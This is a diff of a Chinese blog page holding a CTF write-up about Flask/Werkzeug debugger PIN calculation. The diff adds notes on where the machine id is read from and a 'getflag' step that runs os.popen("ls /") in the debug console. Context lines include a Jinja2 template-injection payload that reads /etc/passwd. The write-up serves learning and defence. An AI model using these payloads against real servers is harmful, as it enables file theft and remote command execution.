@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    5.3k 字
+                    5.4k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    91
+                    92
                      分钟
                   </span>
                 
@@ -854,7 +854,7 @@ def decode():
 <li>getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask，该值一般不变</li>
 <li>flask库下app.py的绝对路径。报错信息会泄露该值。题中为/usr/local/lib/python3.7/site-packages/flask/app.py</li>
 <li>当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)，本题为02:42:ae:01:0d:25，转换后为2485410401573</li>
-<li>机器的id</li>
+<li>机器的id,对于非docker机每一个机器都会有自已唯一的id,Linux：/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件,docker机：/proc/self/cgroup</li>
 </ol>
 <p>读/etc/passwd </p>
 <pre><code class="hljs undefined">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&quot;/etc/passwd&quot;).read()&#125;&#125;
@@ -921,6 +921,11 @@ print(rv)</code></pre>
 
 <p>获取pin码</p>
 <pre><code class="hljs undefined">254-248-525</code></pre>
+
+<p>getflag</p>
+<p>这里用popen是因为用system没有回显</p>
+<pre><code class="hljs undefined">import os
+os.popen(&quot;ls /&quot;).read()</code></pre>
 
 <p><img src="https://s1.ax1x.com/2020/05/20/Y7kiXn.png" srcset="/img/loading.gif" alt="Y7kiXn.png"></p>
 <p>打完收工</p>
